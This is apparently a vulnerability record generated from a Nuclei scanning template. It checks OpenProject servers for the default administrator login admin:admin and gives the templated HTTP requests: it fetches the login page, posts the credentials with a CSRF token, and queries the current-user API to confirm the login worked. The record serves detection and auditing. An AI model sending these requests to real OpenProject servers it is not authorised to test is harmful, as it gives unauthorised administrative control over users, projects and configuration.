# Vulnerability: OpenProject - Default Admin Credentials
**Classification:** OPENPROJECT
**Source:** Nuclei Template (`openproject-default-login.yaml`)

## Description
Detected OpenProject was found using the default administrator credentials admin:admin. An attacker could gain full administrative control, including user management, project data, and system configuration.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}

POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

authenticity_token={{url_encode(csrf_token)}}&username={{username}}&password={{password}}&login=Sign+in

GET /api/v3/users/me HTTP/1.1
Host: {{Hostname}}
```

